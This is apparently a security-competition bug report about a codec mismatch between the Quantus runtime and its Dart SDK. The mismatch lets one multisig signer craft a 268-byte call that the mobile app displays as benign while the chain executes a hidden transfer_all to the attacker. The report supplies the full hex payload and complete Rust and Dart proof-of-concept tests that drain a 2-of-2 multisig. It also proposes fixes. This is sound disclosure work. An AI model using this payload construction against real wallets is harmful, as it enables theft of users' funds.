# 88730 w a critical generated multiaddress index decodes unit as compact letting one signer hide transfer all in an authoritative 2 of 2 multisig proposal and drain the multisig

**Submitted on Aug 14th 2026 at 18:11:23 UTC by @ngosytuan for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88730
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/quantus\\_sdk>
* **Impacts:**
  * Direct theft of user funds

## Description

The exact scoped runtime and the exact scoped Dart SDK disagree on the SCALE type of `MultiAddress::Index`:

* The runtime uses `MultiAddress<AccountId, ()>`, so `Index(())` is encoded as the one-byte enum discriminant `0x01` and consumes no value bytes.
* The generated Dart SDK treats the same variant as `Index(CompactBigInt)` and consumes a compact integer after `0x01`.

Because nested SCALE `RuntimeCall`s are not length-delimited, this is more than a display error. An attacker can construct one byte string that is a complete, canonical call under both schemas but has different call boundaries and different semantics.

The supplied 268-byte payload is decoded by the mobile approval path as:

```
Utility.if_else(
  TechCollective.add_member(Account index 258),
  Wormhole.verify_private_batch(<257 opaque bytes>)
)
```

The runtime decodes the exact same bytes as:

```
Utility.if_else(
  TechCollective.add_member(Index(())),
  Utility.force_batch([
    Balances.force_unreserve(Address20(0xaa...aa), 0),
    Balances.transfer_all(Id(attacker), false),
    System.remark(<62 bytes>),
    System.remark(<62 bytes>),
    System.remark(<52 bytes>),
  ])
)
```

A malicious but sub-threshold signer can submit this as a normal 2-of-2 multisig proposal. The honest signer's mobile client fetches the authoritative call bytes from `Multisig.Proposals`, decodes and renders only the benign interpretation above, then resubmits those exact bytes in `multisig.approve`. That byte-equality check succeeds. On execution, the privileged `add_member` main branch fails under the signed multisig origin, `if_else` invokes the hidden fallback, and `force_batch` continues after the deliberately failing first child to execute `transfer_all`. The multisig's full transferable balance is sent to the attacker.

The PoC uses real ML-DSA-65 keys, a real 2-of-2 multisig, the production call decoders, the production approval byte-binding, and the exact scoped commits. It requires no vanity address, brute force, compromised RPC/indexer, metadata upgrade, forged signature, or victim key.

## Severity and impact

**Suggested severity: Critical — direct theft of user funds / malicious interaction with an already-connected wallet.**

Both affected application assets are listed in the competition scope:

* [`mobile-app`](https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app)
* [`quantus_sdk`](https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/quantus_sdk)

The [Quantus competition scope](https://immunefi.com/audit-competition/audit-comp-quantus/scope/) lists both “Direct theft of user funds” and malicious wallet interactions that modify transaction arguments or submit malicious transactions as Critical website/application impacts. A runnable PoC is mandatory.

The attacker is already one legitimate multisig signer, but is below the configured threshold and has no unilateral authority to move funds. The vulnerability defeats the purpose of the remaining honest signature: the honest signer approves the exact on-chain bytes after the scoped application shows different semantics, no `transfer_all`, and no destination-address field. Once the threshold is reached, the attacker executes the approved proposal and drains 100% of the multisig's transferable balance.

Affected commits:

* Chain/runtime: `3b243b870a5442a6e5f443056f67bbba87d472f5`
* Apps/SDK: `d5fc4d6572ebc2244e95009a33f5da5048935867`

Attacker privileges and interaction:

* One legitimate but sub-threshold multisig signer.
* One normal proposal, one normal review/approval by an honest co-signer, and one normal execution.
* No privileged chain role, RPC/indexer control, victim credentials, physical access, phishing page, or modified application.

## Root cause

### 1. The runtime instantiates `MultiAddress` with a unit index

The runtime address alias is [`MultiAddress<AccountId, ()>`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs#L135):

```rust
pub type Address = MultiAddress<AccountId, ()>;
```

System lookup also uses [`AccountIdLookup<Self::AccountId, ()>`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L113):

```rust
type Lookup = sp_runtime::traits::AccountIdLookup<Self::AccountId, ()>;
```

For this concrete instantiation, the SCALE representation of `MultiAddress::Index(())` is only its variant byte `0x01`. The unit value has zero encoded bytes.

### 2. The scoped Dart codec consumes a `CompactBigInt`

The generated SDK implementation instead defines the Index payload as `BigInt` and decodes it with `CompactBigIntCodec` in [`multi_address.dart`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/generated/planck/types/sp_runtime/multiaddress/multi_address.dart#L152-L174):

```dart
class Index extends MultiAddress {
  const Index(this.value0);

  factory Index._decode(_i1.Input input) {
    return Index(_i1.CompactBigIntCodec.codec.decode(input));
  }

  final BigInt value0;
  // ...
}
```

It therefore consumes bytes belonging to the next nested call.

### 3. The payload deliberately re-synchronizes under both schemas

The first 11 bytes demonstrate the boundary shift:

| Offset | Bytes      | Runtime interpretation                            | App interpretation                                   |
| -----: | ---------- | ------------------------------------------------- | ---------------------------------------------------- |
|    0–1 | `09 06`    | `Utility.if_else`                                 | `Utility.if_else`                                    |
|    2–4 | `0d 00 01` | `TechCollective.add_member(Index(()))`            | Start of the same call and Index variant             |
|    5–6 | `09 04`    | Fallback `Utility.force_batch`                    | Canonical `Compact(258)` consumed as the Index value |
|      7 | `14`       | `Vec` length 5                                    | Pallet 20, `Wormhole`                                |
|      8 | `02`       | First child pallet 2, `Balances`                  | `Wormhole.verify_private_batch`                      |
|   9–10 | `05 04`    | `force_unreserve(Address20(...))`                 | Canonical compact byte length 257                    |
| 11–267 | 257 bytes  | Remaining runtime calls, including `transfer_all` | One opaque proof byte vector                         |

Both decoders consume exactly 268 bytes. Consequently, trailing-byte checks and exact-fit parsing do not detect the payload.

The complete PoC call is:

```
09060d0001090414020504aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa00000000000000000000000000000000020400caad1e5b5296b318fc77ef3822ae82b74613590f03337b5e8220dc806c5cd56f000000f8aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0000f8bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb0000d0cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
```

The destination `caad1e5b5296b318fc77ef3822ae82b74613590f03337b5e8220dc806c5cd56f` belongs to the real ML-DSA-65 key derived from seed `[99; 32]`; it was not ground to satisfy a byte pattern.

### 4. The affected production approval flow trusts this wrong semantic decode

The existing anti-indexer-tampering measures do not help:

{% stepper %}
{% step %}

## [`MultisigService._withOnChainCallData`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/multisig_service.dart#L293-L325)

It replaces indexer data with authoritative bytes from `Multisig.Proposals`.
{% endstep %}

{% step %}

## Mobile confirmation sheet

It passes those bytes to [`CallDecoder.decodeBytes`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart#L183-L195).
{% endstep %}

{% step %}

## Rendered call tree

It renders the resulting tree through [`DecodedCallView`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart#L353-L407).
{% endstep %}

{% step %}

## Approval

The approve flow resubmits the same authoritative bytes in [`multisig.approve`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_approve_confirm_sheet.dart#L38-L53).
{% endstep %}

{% step %}

## Byte-equality check

The chain's [byte-equality check](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L779-L782) passes because no bytes were changed.
{% endstep %}

{% step %}

## Execution

At execution, the runtime [decodes the stored bytes with its own schema and dispatches them as the multisig](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L1123-L1156).
{% endstep %}
{% endstepper %}

The raw attacker AccountId bytes occur inside the 257-byte value displayed as an opaque Wormhole proof, but the scoped application does not semantically display `transfer_all`, `force_batch`, a destination, an amount, or any address-typed field.

### 5. Runtime control flow makes the hidden transfer deterministic

The hidden main branch, `TechCollective.add_member`, requires a privileged origin and fails under the signed multisig origin. [`Utility.if_else`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/utility/src/lib.rs#L568-L635) therefore dispatches the fallback.

The fallback is [`Utility.force_batch`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/utility/src/lib.rs#L451-L508), which records child failures but continues dispatching later children. The deliberately invalid `force_unreserve` child fails, then the following `Balances.transfer_all(Id(attacker), false)` succeeds with the signed multisig origin.

## Exploit sequence

{% stepper %}
{% step %}

## Attacker is a multisig signer

The attacker is one signer of a funded 2-of-2 multisig. They cannot transfer its funds alone.
{% endstep %}

{% step %}

## Construct the dual-valid call

The attacker constructs the 268-byte dual-valid call above, using any attacker-controlled AccountId as the hidden `transfer_all` destination.
{% endstep %}

{% step %}

## Submit the proposal

The attacker submits it through the normal `multisig.propose` dispatchable.
{% endstep %}

{% step %}

## Honest signer reviews the proposal

The honest signer opens the proposal in the scoped mobile application.
{% endstep %}

{% step %}

## Application decodes with shifted boundaries

The application fetches the exact stored bytes, but its generated `MultiAddress::Index` decoder consumes two bytes that the runtime treats as the start of the fallback call.
{% endstep %}

{% step %}

## Benign interpretation is displayed

The review screen displays only `if_else(add_member(Account index 258), Wormhole.verify_private_batch(257 opaque bytes))`. It does not display a transfer or destination.
{% endstep %}

{% step %}

## Honest signer approves

The honest signer confirms once. The application sends `multisig.approve` containing the exact same stored bytes, so the proposal reaches its 2-of-2 threshold.
{% endstep %}

{% step %}

## Attacker executes the proposal

The attacker invokes `multisig.execute`.
{% endstep %}

{% step %}

## Runtime decodes the hidden call tree

The runtime decodes the hidden `force_batch`/`transfer_all` tree and dispatches it as the multisig account.
{% endstep %}

{% step %}

## Multisig balance is transferred

The multisig's full transferable balance is credited to the attacker.
{% endstep %}
{% endstepper %}

## Expected versus actual behavior

**Expected:** The semantic call tree displayed by a signer must be the same call tree the runtime will execute for those exact bytes. An honest signer should see `transfer_all`, its destination, and the fact that the multisig's full transferable balance will move before approving it.

**Actual:** The app and runtime assign different boundaries and types to the same canonical byte string. The app displays a non-transfer tree, while the runtime executes a hidden full-transferable-balance transfer. Binding approval to authoritative bytes does not bind approval to the semantics shown to the signer.

## Public-known-issue differentiation

I reviewed the four published audit PDFs and the relevant public remediation history. I found no disclosure of the `MultiAddress<AccountId, ()>` versus `CompactBigInt` mismatch, a cross-codec SCALE polyglot, or this concrete theft path.

The closest public items have different root causes:

* [quantus-apps PR #555](https://github.com/Quantus-Network/quantus-apps/pull/555) addressed partial cold-payload parsing and network/genesis validation. It did not identify the unit-versus-compact `Index` mismatch.
* [quantus-apps PR #575](https://github.com/Quantus-Network/quantus-apps/pull/575), mobile audit M3, addressed a compromised indexer mislabelling proposal JSON while approvals were insufficiently bound. The scoped commit already fetches authoritative storage bytes and resubmits them exactly. This exploit requires no compromised indexer: those authoritative bytes themselves have two semantic decodings.
* [quantus-apps PR #585](https://github.com/Quantus-Network/quantus-apps/pull/585) added the inner `call` field to approvals and generalized call display. This exploit passes that exact-byte check.

The generated `multi_address.dart` remained unchanged on public upstream main through commit `7e316747be16b52a1e9bdefaa5f428c6e2b9892f`, where [`Index` still consumes `CompactBigInt`](https://github.com/Quantus-Network/quantus-apps/blob/7e316747be16b52a1e9bdefaa5f428c6e2b9892f/quantus_sdk/lib/generated/planck/types/sp_runtime/multiaddress/multi_address.dart#L152-L160).

## Recommended remediation

{% stepper %}
{% step %}

## Generate the concrete runtime address codec

Generate the Dart address codec from the runtime's concrete generic type. For `MultiAddress<AccountId, ()>`, `Index` must carry a unit value and consume no bytes.
{% endstep %}

{% step %}

## Reject unsupported variants in signer-display paths

Prefer rejecting every non-`Id` `MultiAddress` in signer-display paths because this runtime's `AccountIdLookup<AccountId, ()>` cannot resolve meaningful account indices. Fail closed instead of displaying unsupported variants.
{% endstep %}

{% step %}

## Add cross-language conformance tests

Add tests in which Rust encodes every supported concrete `RuntimeCall`/`MultiAddress` variant and Dart must decode the same tree and consume the same boundaries.
{% endstep %}

{% step %}

## Include adversarial nested `Utility` vectors

Assert semantic equivalence, not merely that both decoders consume all bytes or that Dart can re-encode its own interpretation.
{% endstep %}

{% step %}

## Keep authoritative bytes and semantic validation

Keep loading authoritative proposal bytes and binding them into `approve`, but treat semantic decoder correctness as a separate mandatory security property.
{% endstep %}

{% step %}

## Avoid opaque-field WYSIWYS assumptions

Avoid presenting large opaque fields as sufficient WYSIWYS for approval when they can conceal a second parse under a schema mismatch.
{% endstep %}
{% endstepper %}

## Proof of Concept

This PoC is fully self-contained below. It uses only local `TestExternalities`; do not run it against a public network.

It proves all of the following on the exact scoped commits:

* The same 268 bytes decode to a hidden `force_batch`/`transfer_all` in the Rust runtime.
* A real ML-DSA-65 signed extrinsic executes the hidden transfer through `Executive::apply_extrinsic`.
* A real 2-of-2 multisig stores, approves, and executes the identical bytes, draining `1000 * UNIT` to a real attacker key.
* The production Dart decoder used by the mobile proposal model consumes all bytes but shows only `if_else`, `add_member`, and `verify_private_batch`, with no transfer or destination.

### 1. Runtime PoC

Clone and check out the exact chain commit:

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain.git
cd audit-comp-quantus-chain
git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
```

Create `runtime/tests/transactions/multiaddress_polyglot.rs` with the complete contents below:

```rust
//! Regression proof for a cross-repository `MultiAddress::Index` type mismatch.
//!
//! The runtime instantiates `MultiAddress<AccountId32, ()>`, while the mobile
//! codec decodes the Index variant as `Compact<u32>`.  Because SCALE calls are
//! not length-delimited, the extra compact value moves the app's call boundary.

use codec::{DecodeAll, Encode};
use frame_support::{assert_ok, traits::Currency};
use qp_dilithium_crypto::Dilithium65Pair;
use quantus_runtime::{
	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
	Balances, Executive, Runtime, RuntimeCall, RuntimeOrigin, Signature, SignedPayload, System,
	TxExtension, UncheckedExtrinsic, UNIT, VERSION,
};
use sp_core::{crypto::AccountId32, Pair};
use sp_runtime::{
	generic::Era,
	traits::{Dispatchable, IdentifyAccount},
	MultiAddress,
};

use crate::common::TestCommons;

/// Runtime interpretation:
///
/// utility.if_else(
///   tech_collective.add_member(Index(())),
///   utility.force_batch([
///     balances.force_unreserve(Address20(dummy), 0),
///     balances.transfer_all(Id(attacker), false),
///     system.remark(62 bytes),
///     system.remark(62 bytes),
///     system.remark(52 bytes),
///   ]),
/// )
///
/// Mobile interpretation (the same bytes):
///
/// utility.if_else(
///   tech_collective.add_member(Index(258)),
///   wormhole.verify_private_batch(257 opaque bytes),
/// )
fn polyglot_call_bytes(attacker: &AccountId32) -> Vec<u8> {
	let mut bytes = vec![
		9, 6, // Utility.if_else
		13, 0, 1, // runtime: TechCollective.add_member(Index(()))
		9, 4,  // runtime fallback Utility.force_batch; app consumes as Compact Index(258)
		20, // runtime Vec length=5; app fallback pallet Wormhole
		2, 5, 4, // runtime force_unreserve(Address20(...)); app call=2, compact prefix=05 04
	];
	bytes.extend_from_slice(&[0xaa; 20]);
	bytes.extend_from_slice(&[0; 16]); // force_unreserve amount=0 (plain u128)
	bytes.extend_from_slice(&[
		2, 4, 0, // second force_batch call: Balances.transfer_all(Id(...))
	]);
	bytes.extend_from_slice(attacker.as_ref());
	bytes.push(0); // transfer_all keep_alive=false
	bytes.extend_from_slice(&[0, 0, 0xf8]); // System.remark, 62-byte payload
	bytes.extend_from_slice(&[0xaa; 62]);
	bytes.extend_from_slice(&[0, 0, 0xf8]); // System.remark, 62-byte payload
	bytes.extend_from_slice(&[0xbb; 62]);
	bytes.extend_from_slice(&[0, 0, 0xd0]); // System.remark, 52-byte payload
	bytes.extend_from_slice(&[0xcc; 52]);
	bytes
}

fn signed_polyglot(
	pair: &Dilithium65Pair,
	sender: AccountId32,
	call: RuntimeCall,
) -> UncheckedExtrinsic {
	let genesis_hash = System::block_hash(0);
	let tx_ext: TxExtension = (
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(Era::immortal()),
		frame_system::CheckNonce::<Runtime>::from(0),
		frame_system::CheckWeight::<Runtime>::new(),
		ReversibleTransactionExtension::<Runtime>::new(),
		WormholeProofRecorderExtension::<Runtime>::new(),
		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(0),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
		frame_system::WeightReclaim::<Runtime>::new(),
	);

	let payload = SignedPayload::from_raw(
		call.clone(),
		tx_ext.clone(),
		(
			(),
			VERSION.spec_version,
			VERSION.transaction_version,
			genesis_hash,
			genesis_hash,
			(),
			(),
			(),
			(),
			(),
			None,
			(),
		),
	);
	let signature = payload.using_encoded(|encoded| pair.sign(encoded));

	UncheckedExtrinsic::new_signed(
		call,
		MultiAddress::Id(sender),
		Signature::Dilithium65(signature),
		tx_ext,
	)
}

#[test]
fn exact_runtime_decodes_and_executes_hidden_transfer_all() {
	// Both accounts are backed by real ML-DSA-65 keys; no vanity address or
	// brute force is required for the attacker destination.
	let victim_pair = Dilithium65Pair::from_seed_slice(&[42; 32]).expect("valid victim seed");
	let victim = victim_pair.public().into_account();
	let attacker_pair = Dilithium65Pair::from_seed_slice(&[99; 32]).expect("valid attacker seed");
	let attacker = attacker_pair.public().into_account();

	let bytes = polyglot_call_bytes(&attacker);
	println!("attacker={:02x?}", <AccountId32 as AsRef<[u8]>>::as_ref(&attacker));
	println!("call={:02x?}", bytes);
	let decoded = RuntimeCall::decode_all(&mut &bytes[..]).expect("exact runtime call must decode");

	let RuntimeCall::Utility(pallet_utility::Call::if_else { main, fallback }) = &decoded else {
		panic!("expected Utility.if_else, got {decoded:?}");
	};
	assert!(matches!(
		main.as_ref(),
		RuntimeCall::TechCollective(pallet_ranked_collective::Call::add_member {
			who: MultiAddress::Index(()),
		})
	));

	let RuntimeCall::Utility(pallet_utility::Call::force_batch { calls: batch }) =
		fallback.as_ref()
	else {
		panic!("expected hidden Utility.force_batch, got {fallback:?}");
	};
	assert_eq!(batch.len(), 5);
	assert!(matches!(
		&batch[0],
			RuntimeCall::Balances(pallet_balances::Call::force_unreserve {
			who: MultiAddress::Address20(address),
			amount: 0,
		}) if address == &[0xaa; 20]
	));
	assert!(matches!(
		&batch[1],
		RuntimeCall::Balances(pallet_balances::Call::transfer_all {
			dest: MultiAddress::Id(id),
			keep_alive: false,
		}) if id == &attacker
	));
	assert!(
		matches!(&batch[2], RuntimeCall::System(frame_system::Call::remark { remark }) if remark.len() == 62)
	);
	assert!(
		matches!(&batch[3], RuntimeCall::System(frame_system::Call::remark { remark }) if remark.len() == 62)
	);
	assert!(
		matches!(&batch[4], RuntimeCall::System(frame_system::Call::remark { remark }) if remark.len() == 52)
	);

	// First prove dispatch semantics without transaction fees.
	TestCommons::new_test_ext().execute_with(|| {
		Balances::make_free_balance_be(&victim, 1000 * UNIT);
		let before = Balances::free_balance(&victim);
		decoded
			.clone()
			.dispatch(RuntimeOrigin::signed(victim.clone()))
			.expect("force_batch itself succeeds");
		assert_eq!(Balances::free_balance(&victim), 0);
		assert_eq!(Balances::free_balance(&attacker), before);
	});

	// Then prove the byte-decoded call is accepted through the complete signed
	// extrinsic pipeline, including signature validation and all TxExtensions.
	TestCommons::new_test_ext().execute_with(|| {
		Balances::make_free_balance_be(&victim, 1000 * UNIT);
		System::set_block_number(1);
		let xt = signed_polyglot(&victim_pair, victim.clone(), decoded);
		let outcome = Executive::apply_extrinsic(xt).expect("signed extrinsic is valid");
		assert_ok!(outcome);
		assert_eq!(Balances::free_balance(&victim), 0);
		assert!(
			Balances::free_balance(&attacker) > 900 * UNIT,
			"attacker receives the victim balance minus the transaction fee"
		);
	});
}

#[test]
fn two_of_two_multisig_approval_executes_the_hidden_transfer_all() {
	let malicious_pair =
		Dilithium65Pair::from_seed_slice(&[7; 32]).expect("valid malicious signer seed");
	let malicious_signer = malicious_pair.public().into_account();
	let honest_pair = Dilithium65Pair::from_seed_slice(&[8; 32]).expect("valid honest signer seed");
	let honest_signer = honest_pair.public().into_account();
	let attacker_pair = Dilithium65Pair::from_seed_slice(&[99; 32]).expect("valid attacker seed");
	let attacker = attacker_pair.public().into_account();
	let signers = vec![malicious_signer.clone(), honest_signer.clone()];
	let multisig = pallet_multisig::Pallet::<Runtime>::derive_multisig_address(&signers, 2, 0);
	let inner = polyglot_call_bytes(&attacker);

	TestCommons::new_test_ext().execute_with(|| {
		System::set_block_number(1);
		Balances::make_free_balance_be(&malicious_signer, 1000 * UNIT);
		Balances::make_free_balance_be(&honest_signer, 1000 * UNIT);

		assert_ok!(pallet_multisig::Pallet::<Runtime>::create_multisig(
			RuntimeOrigin::signed(malicious_signer.clone()),
			signers,
			2,
			0,
		));
		Balances::make_free_balance_be(&multisig, 1000 * UNIT);

		let bounded_call = inner.clone().try_into().expect("polyglot fits MaxCallSize");
		assert_ok!(pallet_multisig::Pallet::<Runtime>::propose(
			RuntimeOrigin::signed(malicious_signer.clone()),
			multisig.clone(),
			bounded_call,
			100,
		));
		let stored = pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
			.expect("malicious proposal is stored");
		assert_eq!(&stored.call[..], &inner);

		// This is the exact byte blob the honest mobile client fetches from
		// `Multisig.Proposals`, displays through CallDecoder, and resubmits in
		// the approval. The companion Dart test proves that display is benign.
		assert_ok!(pallet_multisig::Pallet::<Runtime>::approve(
			RuntimeOrigin::signed(honest_signer),
			multisig.clone(),
			0,
			stored.call,
		));
		assert_eq!(
			pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
				.expect("approved proposal remains until execution")
				.status,
			pallet_multisig::ProposalStatus::Approved,
		);

		assert_eq!(Balances::free_balance(&attacker), 0);
		assert_ok!(pallet_multisig::Pallet::<Runtime>::execute(
			RuntimeOrigin::signed(malicious_signer),
			multisig.clone(),
			0,
		));
		assert_eq!(Balances::free_balance(&multisig), 0);
		assert_eq!(Balances::free_balance(&attacker), 1000 * UNIT);
		assert!(pallet_multisig::Proposals::<Runtime>::get(&multisig, 0).is_none());
	});
}
```

Add this one module-registration line to `runtime/tests/transactions/mod.rs`:

```rust
pub mod multiaddress_polyglot;
```

Run with Rust 1.93.0:

```bash
cargo test -p quantus-runtime multiaddress_polyglot -- --nocapture
```

Observed result on commit `3b243b870a5442a6e5f443056f67bbba87d472f5`:

```
running 2 tests
test transactions::multiaddress_polyglot::two_of_two_multisig_approval_executes_the_hidden_transfer_all ... ok
test transactions::multiaddress_polyglot::exact_runtime_decodes_and_executes_hidden_transfer_all ... ok

test result: ok. 2 passed; 0 failed; 0 ignored
```

The decisive assertions are:

```
runtime-decoded fallback = Utility.force_batch
runtime-decoded hidden child = Balances.transfer_all(Id(attacker), false)
full signed-extrinsic victim balance after execution = 0
2-of-2 multisig balance after execution = 0
attacker balance after multisig execution = 1000 * UNIT
```

### 2. Scoped SDK/mobile-decoder PoC

Clone and check out the exact apps commit:

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-apps.git
cd audit-comp-quantus-apps
git checkout d5fc4d6572ebc2244e95009a33f5da5048935867
```

Create `quantus_sdk/test/multiaddress_ifelse_polyglot_test.dart` with the complete contents below:

```dart
import 'dart:typed_data';

import 'package:convert/convert.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:polkadart/polkadart.dart' show Blake2bHasher;
import 'package:polkadart/scale_codec.dart';
import 'package:quantus_sdk/quantus_sdk.dart';

const _planckGenesis = '4901bf5c57fd3f9e726af399c763de6670dbdb115a91c0237e173f16eef65e72';

// AccountId of the real attacker ML-DSA-65 key generated from seed [99; 32]
// in the exact-runtime companion test.
const _attackerHex = 'caad1e5b5296b318fc77ef3822ae82b74613590f03337b5e8220dc806c5cd56f';

Uint8List _runtimeCall() {
  final attacker = hex.decode(_attackerHex);
  return Uint8List.fromList([
    9, 6, // Runtime/app: Utility.if_else.
    13, 0, 1, // Runtime: TechCollective.add_member(Index(())).
    9, 4, // Runtime fallback force_batch; app consumes Compact Index(258).
    20, // Runtime Vec length=5; app fallback pallet Wormhole.
    // Runtime: force_unreserve(Address20(dummy), 0). App: Wormhole call 2,
    // followed by canonical Compact bytes 05 04 encoding proof length 257.
    2, 5, 4, ...List<int>.filled(20, 0xaa), ...List<int>.filled(16, 0),
    2, 4, 0, ...attacker, 0, // Hidden runtime transfer_all(Id(attacker), false).
    0, 0, 0xf8, ...List<int>.filled(62, 0xaa),
    0, 0, 0xf8, ...List<int>.filled(62, 0xbb),
    0, 0, 0xd0, ...List<int>.filled(52, 0xcc),
  ]);
}

Uint8List _extensionSuffix() {
  final out = ByteOutput();
  out.pushByte(0); // immortal era
  CompactCodec.codec.encodeTo(0, out); // nonce
  CompactBigIntCodec.codec.encodeTo(BigInt.zero, out); // tip
  out.pushByte(0); // metadata-hash mode disabled
  U32Codec.codec.encodeTo(AppConstants.bundledSpecVersion, out);
  U32Codec.codec.encodeTo(AppConstants.bundledTransactionVersion, out);
  out.write(hex.decode(_planckGenesis));
  out.write(List<int>.filled(32, 0x11));
  out.pushByte(0); // metadata hash = None
  return out.toBytes();
}

Iterable<DecodedCall> _walkCalls(DecodedCall call) sync* {
  yield call;
  for (final field in call.fields) {
    if (field is NestedCallField) yield* _walkCalls(field.call);
    if (field is FieldGroup) {
      for (final item in field.items) {
        if (item is NestedCallField) yield* _walkCalls(item.call);
      }
    }
  }
}

Iterable<ValueField> _walkValues(DecodedCall call) sync* {
  for (final field in call.fields) {
    if (field is ValueField) yield field;
    if (field is NestedCallField) yield* _walkValues(field.call);
    if (field is FieldGroup) {
      for (final item in field.items) {
        if (item is ValueField) yield item;
        if (item is NestedCallField) yield* _walkValues(item.call);
      }
    }
  }
}

void main() {
  test('active signing paths hide the runtime transfer_all', () {
    final callBytes = _runtimeCall();
    final payload = Uint8List.fromList([...callBytes, ..._extensionSuffix()]);
    final parsed = QuantusPayloadParser.parsePayload(payload);

    // Active mobile multisig model receives these authoritative bytes from
    // Multisig.Proposals storage and exposes this tree to its approval sheet.
    final proposal = MultisigProposal(
      entityId: 'poc',
      id: 0,
      multisigAddress: 'multisig',
      proposer: 'malicious signer',
      createdAt: DateTime.fromMillisecondsSinceEpoch(0),
      updatedAt: DateTime.fromMillisecondsSinceEpoch(0),
      pallet: '',
      call: '',
      recipient: '',
      amount: BigInt.zero,
      callRaw: callBytes,
      expiryBlock: 100,
      approvals: const ['malicious signer'],
      deposit: BigInt.zero,
      status: MultisigProposalStatus.active,
      threshold: 2,
      signerCount: 2,
    );
    final mobileDecoded = proposal.decodedCall!;
    expect(mobileDecoded.displayTitle, parsed.call.displayTitle);

    final shownCalls = _walkCalls(parsed.call).map((call) => call.call).toList();
    expect(shownCalls, ['if_else', 'add_member', 'verify_private_batch']);
    expect(shownCalls, isNot(contains('transfer_all')));
    expect(shownCalls, isNot(contains('force_batch')));
    expect(_walkValues(parsed.call).where((field) => field.kind == ValueKind.address), isEmpty);
    expect(_walkValues(parsed.call).map((field) => field.label), isNot(contains('Destination')));

    final nested = parsed.call.fields.whereType<NestedCallField>().toList();
    expect(nested[0].call.fields.whereType<ValueField>().single.value, 'Account index 258');
    expect(nested[1].call.displayTitle, 'Wormhole · verify_private_batch');
    expect(nested[1].call.fields.whereType<ValueField>().single.value.length, 2 + 2 * 257);

    expect(callBytes.length, 268);
    expect(payload.length, 345);
    expect(QuantusSigningPayload.signablePayload(payload), orderedEquals(const Blake2bHasher(32).hash(payload)));
  });
}
```

From `quantus_sdk`, run with Flutter 3.47.0 / Dart 3.13.0:

```bash
cd quantus_sdk
flutter test test/multiaddress_ifelse_polyglot_test.dart --reporter expanded
```

Observed result on commit `d5fc4d6572ebc2244e95009a33f5da5048935867`:

```
00:00 +0: active signing paths hide the runtime transfer_all
00:00 +1: All tests passed!
```

The Dart assertions prove that the exact byte string approved by the honest signer is rendered as:

```
[if_else, add_member, verify_private_batch]
```

and that the displayed tree contains no `transfer_all`, no `force_batch`, no `Destination` label, and no address-typed value. The Rust tests prove that the byte-identical stored proposal drains the multisig when executed.
